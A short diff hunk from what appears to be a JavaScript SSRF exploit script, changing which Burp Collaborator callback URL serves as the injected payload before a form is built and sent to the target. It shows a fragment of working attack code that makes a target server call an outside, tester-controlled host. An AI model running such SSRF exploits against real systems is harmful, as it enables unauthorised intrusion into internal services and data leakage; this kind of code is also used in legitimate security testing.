@@ -72,8 +72,8 @@ async function exploit(targetURL){
     let info = await createAndLogin(targetURL)
 
     await new Promise(r => setTimeout(r, 2000));
-    //payload = "https://ojqweoim23edjkl2ndo23mdi203dm23.burpcollaborator.net:443/"
-    payload = "https://ojqweoim23edjkl2ndo23mdi203dm23.burpcollaborator.net/"
+    payload = "https://ojqweoim23edjkl2ndo23mdi203dm23.burpcollaborator.net:443/"
+   // payload = "https://ojqweoim23edjkl2ndo23mdi203dm23.burpcollaborator.net/"
     spinner.text = 'Successful SSRF Injection: ' + payload;
 
     const form = new FormData();
